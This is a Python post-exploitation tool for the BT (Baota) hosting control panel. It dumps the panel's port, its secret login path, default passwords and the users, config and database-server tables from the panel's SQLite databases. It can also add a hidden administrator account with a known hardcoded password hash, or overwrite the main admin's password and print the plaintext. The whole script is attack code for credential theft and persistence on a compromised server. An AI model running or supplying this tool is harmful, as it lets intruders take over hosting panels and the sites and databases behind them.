import sqlite3,os,optparse
import random
import string

linux_fd_path="/www/server/panel/"
win_fd_path=r"C:/BtSoft/panel/"

linux_panel_port_path="/www/server/panel/data/port.pl"
windows_panel_port_path= r"C:/BtSoft/panel/data/port.pl"

linux_panel_path = "/www/server/panel/data/admin_path.pl"
windows_default_pl_path = "C:/BtSoft/panel/data/admin_path.pl"

linux_default_db_path = r"/www/server/panel/data/db/default.db"
windows_default_db_path = r"C:/BtSoft/panel/data/default.db"

linux_panel_db_path = "/www/server/panel/data/db/panel.db"
windows_panel_db_path=r"C:/BtSoft/panel/data/panel.db"

default_linux_pwd_path = ["/www/server/panel/data/a_pass.pl", "/www/server/panel/data/default.pl"]
default_windows_pwd_path = [r"C:/BtSoft/panel/data/a_pass.pl", r"C:/BtSoft/panel/data/default.pl"]

def os_check():
    if os.name.find("nt")==0:
        return "win"
    else:
        return "lin"

if os_check() == "win":
    bt_fd_path = win_fd_path
    default_port_path = windows_panel_port_path
    pl_path = windows_default_pl_path
    default_db_path = windows_default_db_path
    default_pwd_path = default_windows_pwd_path
    panel_db_path=windows_panel_db_path
else:
    bt_fd_path = linux_fd_path
    default_port_path = linux_panel_port_path
    pl_path = linux_panel_path
    default_db_path = linux_default_db_path
    default_pwd_path = default_linux_pwd_path
    panel_db_path=linux_panel_db_path

if os.path.exists(bt_fd_path) == False:
    print("[-] Not Found Bt path")
    exit(0)


def get_default_info():
    port=open(default_port_path,"r").read()
    print(f"[*] bt port:{port}")

    pl = open(pl_path, 'r').read()
    print(f"[*] bt admin login path:{pl}")

    conn = sqlite3.connect(default_db_path)
    c = conn.cursor()
    print("[*] default.db config")
    rows = c.execute("select * from config")
    for data in rows:
        print(data)

    print("\n[*] default.db databases")
    rows = c.execute("select * from databases")
    for data in rows:
        print(data)

    rows = c.execute("select * from database_servers")
    for data in rows:
        print(data)

    print("\n[*] default.db users")
    rows = c.execute("select * from users")
    for data in rows:
        print(data)


    print("\n[*] default password")
    for path in default_pwd_path:
        if os.path.exists(path):
            default_pwd=open(path,"r").read()
            print(default_pwd)

    print("\n[*] (default username id=>1)panel db users")
    try:
        conn=sqlite3.connect(panel_db_path)
        c = conn.cursor()
        rows=c.execute("select * from users")
        for data in rows:
            print(data)

        conn.commit()
        conn.close()
    except Exception as error:
        print(f"[-] db path:{panel_db_path} Not Found table users")


def add_default_user(id=0):
    conn = sqlite3.connect(default_db_path)
    c = conn.cursor()
    rows=c.execute("select * from users")
    lastid=0
    calc=0
    username=""
    for data in rows:
        calc+=1
        lastid=data[0]
        if calc==1:
            username=data[1]


    if id==1:
        sql='''update users set password="ea1b5465b975ffdbe9e0df05fc0f5dca" where id=1'''
        sql2='''update users set salt="Vf0JoGbf4wg5" where id=1'''
        tips="edit"
        password = "951753afj;"
        try:
            c.execute(sql)
            c.execute(sql2)
        except:
            pass

        conn.commit()
        conn.close()
    else:
        username = "".join([random.choice(string.ascii_letters) for x in range(0, 8)])
        sql=f'''INSERT INTO users (id,username,password,login_ip,login_time,phone,email,salt)  VALUES ({lastid+1},"{username}","ea1b5465b975ffdbe9e0df05fc0f5dca",0,0,0,"test@message.com","Vf0JoGbf4wg5")'''
        sql2=f'''INSERT INTO users (id,username,password,login_ip,login_time,phone,email)  VALUES ({lastid+1},"{username}","21232f297a57a5a743894a0e4a801fc3",0,0,0,"287962566@qq.com")'''
        tips="add"
        password = "951753afj;"
        try:
            c.execute(sql)
        except sqlite3.OperationalError as error:
            if "no column named salt" in str(error):
                c.execute(sql2)
                password="admin"

        conn.commit()
        conn.close()

    print(f"[+] default.db {tips} user Username:{username} Password:{password}")

def add_panel_user(id=0):
    conn = sqlite3.connect(panel_db_path)
    c = conn.cursor()
    rows = c.execute("select * from users")
    lastid = 0
    calc=0
    username=""
    for data in rows:
        calc+=1
        lastid = data[0]
        if calc==1:
            username=data[1]

    try:
        if id==1:
            sql=f'''update users set password="BT-0x:sFgP1k7DVAGxwEiqeeWh9bxsOmSI5eoMtXwz+Hc2y0+ZgKNBpSeXcdhkZXU+3HXf" where id=1'''
            sql2='''update users set salt="" where id=1'''
            tips="edit"
            c.execute(sql)
            c.execute(sql2)
            conn.commit()
            conn.close()
        else:
            username = "".join([random.choice(string.ascii_letters) for x in range(0, 8)])
            tips="add"
            lastid+=1
            sql=f'''INSERT INTO users (id,username,password,login_ip,login_time,phone,email,salt)  VALUES ({lastid},"{username}","BT-0x:sFgP1k7DVAGxwEiqeeWh9bxsOmSI5eoMtXwz+Hc2y0+ZgKNBpSeXcdhkZXU+3HXf","0","2016-12-10 15:12:56","0","BT-0x:PevLD+mrfY45oU2CLpPMU6d+SszswyKKCt9LtQ2yfj4=","")'''
            c.execute(sql)

            conn.commit()
            conn.close()
        print(f"[+] panel.db {tips} user Username:{username} Password:ubuntu123456")
    except Exception as error:
        print(f"[-] panel user add Failure,error:{error}")

if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-g",dest="get_default_info",action="store_true",help="get bt default info")
    parser.add_option("--add_default_user",dest="add_default_user",action="store_true",help="default.db add user")
    parser.add_option("--add_panel_user",dest="add_panel_user",action="store_true",help="panel.db add user")
    parser.add_option("--edit_default_user",dest="edit_default_user",action="store_true",help="default.db user id 1,edit password")
    parser.add_option("--edit_panel_user",dest="edit_panel_user",action="store_true",help="panel.db user id 1,edit password")
    (option,args)=parser.parse_args()
    if option.get_default_info:
        get_default_info()
    elif option.add_default_user:
        add_default_user()
    elif option.edit_default_user:
        add_default_user(id=1)
    elif option.add_panel_user:
        add_panel_user()
    elif option.edit_panel_user:
        add_panel_user(id=1)

    else:
        parser.print_help()
